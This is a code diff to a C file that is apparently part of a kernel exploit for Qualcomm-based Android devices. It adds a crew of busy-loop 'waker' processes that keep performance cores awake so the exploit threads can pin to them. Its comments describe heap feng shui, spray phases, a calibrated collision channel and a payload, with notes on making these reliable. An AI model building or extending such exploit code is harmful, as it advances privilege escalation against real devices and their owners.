@@ -188,6 +188,9 @@ static const char *rmg_temp_str(int millideg) {
 
 static void rmg_log_pin_diag(const char *why);
 
+/* Waker crew size; the crew itself is defined further down. */
+#define RMG_WAKER_CREW 6
+
 /*
  * Gate wait (2026-08-27, round 4 — root cause known). The perf-core
  * "restriction" is Qualcomm WALT CPU HALT: walt_halt.c's vendor hook
@@ -205,6 +208,12 @@ static void rmg_log_pin_diag(const char *why);
  * pair is pinned, 0 when the budget burns out (caller fails cleanly).
  */
 int rmg_pin_gate_wait(int max_wait_sec, const char *stage) {
+  /* Demand-driven resume: top up the waker crew and give core_ctl a
+   * moment to eval it, so the first probe sees unhalted perf cores.
+   * Callers that need a quiet device (heap feng shui) stop the crew
+   * right after their pin lands; the next gate wait respawns it. */
+  rmg_waker_start(RMG_WAKER_CREW);
+  usleep(500 * 1000);
   for (int waited = 0;; waited += 2) {
     if (rmg_pin_gate_ready()) {
       if (waited > 0) {
@@ -238,7 +247,7 @@ int rmg_pin_gate_wait(int max_wait_sec, const char *stage) {
 }
 
 /*
- * Cluster waker (2026-08-27, round 4). Busy-loop children with a wide
+ * Cluster waker (2026-08-27, round 4/5). Busy-loop children with a wide
  * affinity mask: their runnable demand makes WALT core_ctl resume the
  * halted perf cores (need_cpus eval: busy_pct >= busy_up_thres and
  * nrrun >= task_thres=4), so the gate probe and the pair pin land while
@@ -246,12 +255,17 @@ int rmg_pin_gate_wait(int max_wait_sec, const char *stage) {
  * rmg_waker_relocate() moves the crew off the pair cores — the pinned
  * exploit threads keep those two cores busy (halt only takes idle
  * cores) and the crew must not disturb the calibrated collision
- * channel. Children die with the parent (PR_SET_PDEATHSIG, verified
- * parent at entry) and self-terminate after RMG_WAKER_MAX_LIFE_SEC
- * (alarm), so a supervisor SIGKILL of the payload cannot leak spinning
- * orphans.
+ * channel. IMPORTANT (round 5): the crew is started ONLY inside gate
+ * waits and stopped again once the pin lands — running it through the
+ * heap-shaping/spray phases perturbs the allocator state the cache
+ * gate relies on (observed: 12/12 "phys step cache gate failed
+ * slab=0" with the crew left running). Children die with the parent
+ * (PR_SET_PDEATHSIG, verified parent at entry) and self-terminate
+ * after RMG_WAKER_MAX_LIFE_SEC (alarm), so a supervisor SIGKILL of the
+ * payload cannot leak spinning orphans.
  */
 #define RMG_WAKER_MAX 6
+#define RMG_WAKER_CREW 6
 #define RMG_WAKER_MAX_LIFE_SEC 300
 
 static pid_t rmg_waker_pid[RMG_WAKER_MAX];
